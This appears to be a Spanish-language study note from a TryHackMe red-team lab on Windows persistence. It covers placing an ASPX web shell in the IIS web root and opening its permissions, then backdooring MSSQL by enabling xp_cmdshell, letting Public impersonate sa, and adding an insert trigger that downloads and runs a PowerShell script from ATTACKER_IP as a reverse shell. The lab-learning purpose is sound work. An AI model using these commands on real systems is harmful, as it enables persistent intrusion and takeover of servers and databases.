---
tags: [red-team, persistence, windows, webshell, mssql]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Abusing Services]]"
  - "[[Backdooring Files]]"
---
Aprovechar servicios ya instalados (web server, base de datos) para ejecutar codigo y mantener acceso.

---

## Web Shells

Subir una web shell al directorio web del servidor. Por defecto en IIS: `C:\inetpub\wwwroot\`.

```shell
move shell.aspx C:\inetpub\wwwroot\
```

Acceder desde: `http://MACHINE_IP/shell.aspx`

> [!warning] Si hay error de permisos, otorgar acceso con `icacls shell.aspx /grant Everyone:F`

> [!info] El usuario por defecto de IIS (`iis apppool\defaultapppool`) tiene `SeImpersonatePrivilege`, lo que permite escalar a Administrator usando exploits como potato attacks.

---

## MSSQL como Backdoor (Triggers)

Los **triggers** en MSSQL ejecutan acciones ante eventos especificos en la base de datos (INSERT, UPDATE, DELETE, login).

### Configuracion previa

Habilitar `xp_cmdshell` (permite ejecutar comandos del sistema desde SQL):

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Permitir que cualquier usuario de la app web pueda impersonar al admin de BD:

```sql
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

### Crear el trigger

El trigger usa `xp_cmdshell` para ejecutar PowerShell y descargar un script .ps1 desde el servidor del atacante. Se dispara en cada INSERT sobre la tabla Employees:

```sql
USE HRDB

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

El script `.ps1` del atacante contiene una reverse shell en PowerShell que abre un socket TCP hacia el atacante.

### Ejecucion

Se necesitan dos listeners simultaneos:

| Terminal | Comando | Proposito |
|----------|---------|-----------|
| 1 | `python3 -m http.server` | Servir el script .ps1 |
| 2 | `nc -lvp 4454` | Recibir la reverse shell |

> [!tip] El trigger se dispara cada vez que la app web inserta un registro en la tabla Employees. Basta con usar la funcionalidad normal de la aplicacion.
